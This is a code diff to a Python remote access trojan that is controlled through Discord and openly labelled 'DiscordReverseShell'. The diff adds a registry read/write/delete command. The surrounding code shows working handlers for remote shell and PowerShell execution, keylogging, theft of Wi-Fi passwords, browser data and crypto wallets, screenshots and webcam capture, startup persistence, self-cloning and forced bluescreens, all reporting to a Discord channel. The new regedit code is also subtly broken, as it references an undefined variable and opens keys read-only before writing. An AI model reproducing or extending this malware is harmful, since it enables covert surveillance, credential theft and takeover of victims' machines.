@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard
+import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
 import cv2
@@ -110,6 +110,7 @@ commands = "\n".join([
     "keylogger - Enable keylogger -- WIP -- !cant be stopped, only thru reboot or shutdown!",
     "freeze <1/0> - Freeze all inputs from keyboard and mouse",
     "clone <path> - Clone the malware to the specified path, make sure to enter path whit name of the output file",
+    "regedit <1 / 2 / 3> <key path> <value name> OR regedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data> - Regedit: 1 - Show value, 2 - Create value, 3 - Delete value",
     "!quit - Exit session without deleting all the data",
     "!exit - Exit session and delete all data"
 ])
@@ -249,16 +250,19 @@ async def on_message(message):
 
     if message.webhook_id is not None:
         return
-    
+
+#HELP    
     if message.content == "help":
         embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#PING
     elif message.content == "ping":
         msg = f"PONG, `{round(client.latency * 1000)}ms`"
         await message.reply(content=msg)
 
+#! SYSTEM INFO
     elif message.content == "sys":
         await message.reply("Fetching data...", delete_after=.3)
         start()
@@ -272,7 +276,8 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.channel.send(embed=embed)
         delete_files(["system.txt"])
-    
+
+#! CLIPBOARD
     elif message.content == "clipboard":
         try:
             clipboard = paste()
@@ -291,7 +296,8 @@ async def on_message(message):
         embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-            
+
+#! PROCESSES    
     elif message.content == "processes":
         try: 
             tasks = os.popen("tasklist").read()
@@ -310,7 +316,7 @@ async def on_message(message):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed)
     
-    
+#! CD
     elif message.content.startswith("cd"):
         directory = message.content[3:] #.split(" ")[1]
         try:
@@ -321,6 +327,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#! LS
     elif message.content == "ls":
         files = "\n".join(os.listdir())
         if files == "":
@@ -339,12 +346,14 @@ async def on_message(message):
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-        
+
+#! CWD    
     elif message.content == "cwd":
         embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#! DOWNLOAD
     elif message.content.startswith("download"):
         file = message.content[9:] #.split(" ")[1]
         try:
@@ -356,6 +365,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#! UPLOAD
     elif message.content.startswith("upload"):
         link = message.content[7:] #.split(" ")[1]
         try:
@@ -369,6 +379,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
 
+#! CMD
     elif message.content.startswith("cmd"):
         command = message.content[4:]
         try:
@@ -411,7 +422,7 @@ async def on_message(message):
             
         await message.reply(embed=embed)
         
-        
+#! POWERSHELL    
     elif message.content.startswith("pw"):
         command = message.content[3:]
         try:
@@ -454,6 +465,7 @@ async def on_message(message):
             
         await message.reply(embed=embed)
 
+#! RUN
     elif message.content.startswith("run"):
         file = message.content[4:]
         if file == "":
@@ -467,12 +479,13 @@ async def on_message(message):
             #return
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-    
+
+#! STARTUP
     elif message.content == "startup":
         Startup(sys.argv[0])
         await message.reply("Startup Enabled!")
         
-        
+#! BLUESCREEN    
     elif message.content == "bluescreen":
         await message.reply("Attempting...", delete_after=.1)
         try:
@@ -489,7 +502,7 @@ async def on_message(message):
         else:
             await message.reply("Bluescreen Failed!")
 
-
+#! WIFI
     elif message.content == "wifi":
         WifiPasswords().run()
         with open("wifi.txt", "r") as f:
@@ -507,7 +520,7 @@ async def on_message(message):
         await message.reply(embed=embed)
         delete_files(["wifi.txt"])
 
-    
+#! SCREENSHOT
     elif message.content == "screenshot":
         try:
             screenshot = ImageGrab.grab(all_screens=True)
@@ -522,6 +535,7 @@ async def on_message(message):
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=file)
 
+#! WEBCAM
     elif message.content == "webcam":
         try:
             cap = cv2.VideoCapture(0)
@@ -541,14 +555,16 @@ async def on_message(message):
         embed.set_image(url="attachment://webcam.png")
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed, file=webcam)
-    
+
+#! BROWSER
     elif message.content == "browser":
         await browsers(message.channel)
 
+#! WALLETS
     elif message.content == "wallet":
         await wallets(message.channel)
     
-
+#! KEYLOGGER
     elif message.content == "keylogger":
         await message.reply("Creating new webhook for keylogger...")
         try:
@@ -564,7 +580,7 @@ async def on_message(message):
         
         await message.reply("Keylogger enabled!")
     
-    
+#! FREEZE
     elif message.content.startswith("freeze "):
         action = message.content[7:]
         
@@ -584,7 +600,7 @@ async def on_message(message):
                 freezed = False
                 await message.reply("Inputs are unfrezzed!")
         
-
+#! CLONE
     elif message.content.startswith("clone "):
         path = message.content[6:]
         _, extension = os.path.splitext(path)
@@ -615,11 +631,94 @@ async def on_message(message):
             os.chdir(os.path.dirname(sys.argv[0]))
             return
         os.chdir(os.path.dirname(sys.argv[0]))
+    
+#! REGEDIT
+    elif message.content.startswith("regedit "):
+        action = message.content[8:9]
 
-        
+
+        if action == "1":
+            try:
+                data = message.content[10:].split(" ")
+                
+                root_path, key_path = data[0].split("\\", 1)
+                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
+                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)
+
+                value_name = data[1]
+                value, type = winreg.QueryValueEx(key, value_name)
+                winreg.CloseKey(key)
+
+                embed = discord.Embed(title="Regedit", description=f"```Value Path: {root_path}\\{key_path}\\{value_name}\nValue: {value}\nValue type: {type}```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+            except:
+                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+
+        elif action == "2":
+            try:
+                data = msg[10:].split(" ")
+                
+                root_path, key_path = data[0].split("\\", 1)
+                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
+                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)
+
+                value_name = data[1]
+                value_data = data[3]
+                value_types = {
+                    "string": winreg.REG_SZ,
+                    "expandable_string": winreg.REG_EXPAND_SZ,
+                    "multi_string": winreg.REG_MULTI_SZ,
+                    "dword": winreg.REG_DWORD,
+                    "qword": winreg.REG_QWORD,
+                    "binary": winreg.REG_BINARY,
+                }
+                value_type = value_types[data[2]]
+
+                winreg.SetValueEx(key, value_name, 0, value_type, value_data)
+
+                winreg.CloseKey(key)
+                embed = discord.Embed(title="Regedit", description=f"```Created new value: {value_name}\nValue data: {value_data}\nValue type: {value_type}\nKey path: {data[0]}```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+            except:
+                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name!```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+                return
+
+        elif action == "3":
+            try:
+                data = msg[10:].split(" ")
+                
+                root_path, key_path = data[0].split("\\", 1)
+                root_key = winreg.ConnectRegistry(None, getattr(winreg, root_path))
+                key = winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ)
+
+                value_name = data[1]
+                winreg.DeleteValue(key, value_name)
+
+                winreg.CloseKey(key)
+                embed = discord.Embed(title="Regedit", description=f"```Deleted value: {value_name}\nPath: {data[0]}```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+            except:
+                embed = discord.Embed(title="Regedit", description="```Invalid key path or value name```", color=0xfafafa)
+                embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+                await message.reply(embed=embed)
+                return
+        else:
+            embed = discord.Embed(title="Regedit", description="```Invalid command, make sure to structure your command like this:\nregedit <1 / 3> <key path> <value name>\nOR\nregedit 2 <key path> <value name> <value type: string / expandable_string / multi_string / dword / qword / binary> <value data>```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+
+#QUIT
     elif message.content == "!quit":
         await client.close()
-       
+
+#EXIT  
     elif message.content == "!exit":
         await message.channel.delete()
         await client.close()
